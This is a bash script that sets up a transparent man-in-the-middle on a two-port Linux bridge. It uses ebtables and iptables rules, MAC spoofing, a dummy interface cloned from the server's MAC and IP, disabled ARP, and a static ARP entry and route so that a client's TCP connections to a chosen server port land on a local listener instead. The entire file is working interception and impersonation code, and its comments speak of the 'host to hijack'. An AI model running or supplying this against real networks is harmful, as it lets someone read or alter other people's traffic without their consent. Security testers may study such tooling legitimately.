#!/bin/bash

help() {
	echo "Usage: $0 \\"
	echo "           --bridge <ifname> \\"
	echo "           --server <ipaddr> <macaddr> <portnum>\\"
	echo "           --client <ipaddr> <macaddr> \\"
	echo "           --local-port <port>"
}

fail() {
	echo "$1" >&2
	exit 1
}

valid_ip() {
	[[ "$1" =~ ^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$ ]]
}

valid_mac() {
	[[ "$1" =~ ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$ ]]
}

OPTS=`getopt -l bridge:,local-port:,server:,client: -n 'parse-options' -- "$@"`

if [ $? != 0 ] ; then help; >&2 ; exit 1 ; fi

while true; do
	case "$1" in
		--bridge )
			BRIDGE_IF="$2"
			shift; shift ;;
		--server )
			SERVER_IP="$2"
			SERVER_MAC="$3"
			SERVER_PORT="$4"
			shift; shift; shift; shift ;;
		--client )
			CLIENT_IP="$2"
			CLIENT_MAC="$3"
			shift; shift; shift ;;
		--local-port )
			LOCAL_PORT="$2"
			shift; shift ;;
		-- ) shift; break ;;
		* ) break ;;
	esac
done

# Validate BRIDGE_IF
BRLIST="$(brctl show $BRIDGE_IF | tail -n +2)"

if [ "$(echo "$BRLIST" | wc -l)" != 2 ]; then
	fail "The specified bridge does not exist, or does not have exactly 2 interfaces attached to it"
fi

# Validate SERVER_*, CLIENT_*
if ! valid_ip "$SERVER_IP" || ! valid_ip "$CLIENT_IP"; then
	fail "Invalid server and/or client IP address"
elif ! valid_mac "$SERVER_MAC" || ! valid_mac "$CLIENT_MAC"; then
	fail "Invalid server and/or client MAC address"
elif ! [[ "$SERVER_PORT" =~ ^[0-9]{1,5}$ ]]; then
	fail "Invalid server port"
fi

# Determine $BRIDGE_SERVER_IF
STPSTAT="$(brctl showstp $BRIDGE_IF | grep -vE '(^ |^$)')"
MACSTAT="$(brctl showmacs $BRIDGE_IF | grep "$SERVER_MAC")"

if [ "$(echo "$STPSTAT" | head -1)" != "$BRIDGE_IF" ]; then
	fail "Unexpected output from 'brctl showstp'"
elif [ -z "$MACSTAT" ]; then
	fail "This MAC is not or no longer known by $BRIDGE_IF"
fi

IFNUM=$(echo "$MACSTAT" | awk '{print $1}')
BRIDGE_SERVER_IF="$(echo "$STPSTAT" | perl -ne 'print "$1" if /^([^ ]+) \('$IFNUM'\)/g')"

if [ -z "$BRIDGE_SERVER_IF" ]; then
	fail "Unable to determine server-facing bridge interface"
fi

# Server-facing interface retrieved, now get its MAC
BRIDGE_SERVER_MAC=$(cat /sys/class/net/$BRIDGE_SERVER_IF/address)

if ! valid_mac "$BRIDGE_SERVER_MAC"; then
	fail "Auto-resolved bridge server mac '$BRIDGE_SERVER_MAC' invalid"
fi

# Assume client is behind the opposite bridge interface
BRIDGE_CLIENT_IF="$(echo "$BRLIST" | grep -v $BRIDGE_SERVER_IF\$ | awk '{print $NF}')"

##
## Action starts here
##

# Un-bridge traffic destined for other side of bridge
# so it can be manipulated
ebtables -t broute -A BROUTING \
	-i $BRIDGE_CLIENT_IF -p ipv4 --ip-dst $SERVER_IP --ip-proto tcp --ip-destination-port $SERVER_PORT \
	-j redirect --redirect-target DROP

# Spoof src MAC of returning traffic
# this only works if we inject return traffic into $BRIDGE_IF (instead of $BRIDGE_CLIENT_IF)
ebtables -t nat -A POSTROUTING \
	-o $BRIDGE_CLIENT_IF -p ipv4 --ip-src $SERVER_IP --ip-proto tcp --ip-source-port $SERVER_PORT -s $BRIDGE_SERVER_MAC \
	-j snat --to-src $SERVER_MAC
	
# Create virtual interface
# MAC addr = host to hijack
modprobe dummy
ip link set name fake0 dev dummy0
ifconfig fake0 hw ether $SERVER_MAC 

# Disable possible ARP packets from host
ip link set arp off dev fake0
ip link set arp off dev $BRIDGE_SERVER_IF
ip link set arp off dev $BRIDGE_CLIENT_IF

# Assign IP addr to virtual interface
# IP addr = host to hijack
ifconfig fake0 $SERVER_IP

# Add static ARP entry towards hijacked client
# Send traffic through $BRIDGE_IF so ebtables can spoof src MAC (using $BRIDGE_CLIENT_IF would work too)
ACTION=$([ -z "$(ip neigh show $CLIENT_IP)" ] && echo add || echo replace)
ip neigh $ACTION $CLIENT_IP lladdr $CLIENT_MAC nud permanent dev $BRIDGE_IF

# Add static route towards hijacked client
ip route add $CLIENT_IP dev $BRIDGE_IF proto kernel scope link src $SERVER_IP

# NAT traffic to our local listening port
if [ "$SERVER_PORT" != "$LOCAL_PORT" ]; then
    iptables -t nat -A PREROUTING -i $BRIDGE_CLIENT_IF -p tcp --dport $SERVER_PORT -j DNAT --to $SERVER_IP:$LOCAL_PORT
fi